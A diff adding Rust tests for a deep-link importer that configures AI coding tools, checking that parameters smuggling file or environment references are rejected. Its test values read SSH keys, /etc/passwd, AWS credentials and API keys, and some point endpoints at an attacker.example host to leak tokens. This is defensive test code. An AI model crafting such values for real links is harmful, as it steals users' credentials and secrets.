@@ -993,3 +993,93 @@ fn test_infer_homepage_from_endpoint_without_homepage() {
         Some("https://cubence.com".to_string())
     );
 }
+
+// =============================================================================
+// 累加式应用会解释的写法：环境变量、文件引用
+// =============================================================================
+
+fn link_with(app: &str, param: &str, raw_value: &str) -> String {
+    let mut params = vec![
+        ("resource", "provider"),
+        ("app", app),
+        ("name", "Example"),
+        ("endpoint", "https://api.example.com/v1"),
+        ("apiKey", "sk-test"),
+        ("model", "m"),
+    ];
+    params.retain(|(key, _)| *key != param);
+    params.push((param, raw_value));
+    let query: String = url::form_urlencoded::Serializer::new(String::new())
+        .extend_pairs(params)
+        .finish();
+    format!("ccswitch://v1/import?{query}")
+}
+
+#[test]
+fn test_links_that_smuggle_env_vars_or_files_into_additive_apps_are_rejected() {
+    for (app, param, value) in [
+        ("opencode", "apiKey", "{file:~/.ssh/id_ed25519}"),
+        ("opencode", "apiKey", "{file:/etc/passwd}"),
+        ("opencode", "apiKey", "{env:ANTHROPIC_API_KEY}"),
+        ("opencode", "model", "${HOME}"),
+        (
+            "opencode",
+            "endpoint",
+            "https://attacker.example/{env:GITHUB_TOKEN}",
+        ),
+        (
+            "openclaw",
+            "endpoint",
+            "https://attacker.example/${OPENAI_API_KEY}",
+        ),
+        ("openclaw", "apiKey", "${OPENAI_API_KEY}"),
+        ("hermes", "apiKey", "${ANTHROPIC_API_KEY}"),
+        ("hermes", "name", "${HOME}"),
+    ] {
+        let err = parse_deeplink_url(&link_with(app, param, value))
+            .expect_err("dynamic syntax must be rejected while parsing");
+        assert!(
+            err.to_string().contains(param),
+            "{app}/{param}={value}: {err}"
+        );
+    }
+}
+
+#[test]
+fn test_dynamic_syntax_guard_leaves_ordinary_values_alone() {
+    for (app, param, value) in [
+        ("opencode", "apiKey", "sk-abc$1def"),
+        ("opencode", "apiKey", "sk-{not-a-reference}"),
+        // 切换式应用的客户端不展开这些写法，照常导入
+        ("claude", "apiKey", "!literal-key"),
+        ("codex", "apiKey", "${literal}"),
+    ] {
+        parse_deeplink_url(&link_with(app, param, value))
+            .unwrap_or_else(|err| panic!("{app}/{param}={value} should parse: {err}"));
+    }
+}
+
+#[test]
+fn test_dynamic_syntax_guard_also_covers_values_from_config_and_direct_requests() {
+    use super::provider::build_provider_from_request;
+
+    // config 里补来的 Key 在合并时就拒绝
+    let config = BASE64_STANDARD.encode(r#"{"apiKey":"{file:~/.aws/credentials}"}"#);
+    let url = format!(
+        "ccswitch://v1/import?resource=provider&app=opencode&name=Example&endpoint=https%3A%2F%2Fapi.example.com%2Fv1&model=m&config={config}"
+    );
+    let request = parse_deeplink_url(&url).expect("URL params themselves are fine");
+    assert!(parse_and_merge_config(&request).is_err());
+
+    // 前端可以直接把请求发给导入命令，不经过解析器：构建时还要再查一次
+    let request = DeepLinkImportRequest {
+        resource: "provider".to_string(),
+        app: Some("hermes".to_string()),
+        name: Some("Example".to_string()),
+        endpoint: Some("https://api.example.com/v1".to_string()),
+        api_key: Some("${HOME}".to_string()),
+        model: Some("m".to_string()),
+        ..Default::default()
+    };
+    assert!(build_provider_from_request(&AppType::Hermes, &request).is_err());
+}
